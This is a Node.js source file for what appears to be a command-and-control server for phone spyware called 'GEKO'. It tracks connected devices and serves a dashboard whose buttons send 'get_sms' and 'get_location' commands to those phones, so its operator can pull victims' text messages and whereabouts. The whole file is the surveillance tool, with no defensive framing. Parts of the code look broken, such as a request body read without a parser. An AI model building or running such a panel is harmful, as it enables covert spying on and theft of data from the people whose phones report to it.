// 🦎 GEKO KOYEB SERVER
const express = require('express');
const WebSocket = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let devices = [];

wss.on('connection', (ws, req) => {
  const deviceId = Date.now().toString();
  const model = req.headers.model || 'Unknown';
  
  console.log('📱 Connected:', model);
  
  devices.push({
    id: deviceId,
    model: model,
    battery: req.headers.battery || '100%',
    ws: ws,
    online: true,
    connectedAt: new Date()
  });
  
  ws.on('message', (data) => {
    console.log('📨 From', model + ':', data.toString().substring(0, 30));
  });
  
  ws.on('close', () => {
    console.log('📴 Disconnected:', model);
  });
});

app.get('/api/devices', (req, res) => {
  res.json({
    success: true,
    devices: devices.map(d => ({
      id: d.id,
      model: d.model,
      battery: d.battery,
      online: d.online,
      connectedAt: d.connectedAt
    }))
  });
});

app.post('/api/command', (req, res) => {
  const { deviceId, command } = req.body;
  const device = devices.find(d => d.id === deviceId);
  
  if (device && device.online) {
    device.ws.send(JSON.stringify({ type: 'command', cmd: command }));
    res.json({ success: true, message: 'Command sent' });
  } else {
    res.json({ success: false, error: 'Device offline' });
  }
});

app.get('/dashboard', (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>🦎 GEKO KOYEB</title>
    <style>
      body { background: #0a0a0a; color: #00ff88; font-family: Arial; padding: 20px; }
      h1 { color: #00ff88; }
      .device { border: 1px solid #00ff88; padding: 15px; margin: 10px; border-radius: 8px; }
      button { background: #00ff88; color: #000; border: none; padding: 10px; margin: 5px; }
    </style>
  </head>
  <body>
    <h1>🦎 GEKO CONTROL - KOYEB</h1>
    <p>Devices: <span id="count">0</span></p>
    <div id="devices">Loading...</div>
    <script>
      async function load() {
        try {
          const res = await fetch('/api/devices');
          const data = await res.json();
          
          document.getElementById('count').textContent = data.devices.length;
          
          let html = '';
          data.devices.forEach(device => {
            html += '<div class="device">';
            html += '<h3>' + device.model + ' ' + (device.online ? '🟢' : '🔴') + '</h3>';
            html += '<p>ID: ' + device.id.substring(0, 10) + '...</p>';
            html += '<button onclick="sendCmd(\\\\'' + device.id + '\\\\', \\\\'get_sms\\\\')">📨 SMS</button>';
            html += '<button onclick="sendCmd(\\\\'' + device.id + '\\\\', \\\\'get_location\\\\')">📍 Location</button>';
            html += '</div>';
          });
          
          document.getElementById('devices').innerHTML = html || '<p>No devices</p>';
        } catch (e) {
          console.error(e);
        }
      }
      
      async function sendCmd(id, cmd) {
        const res = await fetch('/api/command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ deviceId: id, command: cmd })
        });
        
        const data = await res.json();
        alert(data.success ? 'Command sent!' : 'Error: ' + data.error);
      }
      
      setInterval(load, 3000);
      load();
    </script>
  </body>
  </html>
  `);
});

app.get('/', (req, res) => res.redirect('/dashboard'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log('🦎 Koyeb Server running on port', PORT);
  console.log('📊 Dashboard: http://localhost:' + PORT + '/dashboard');
});
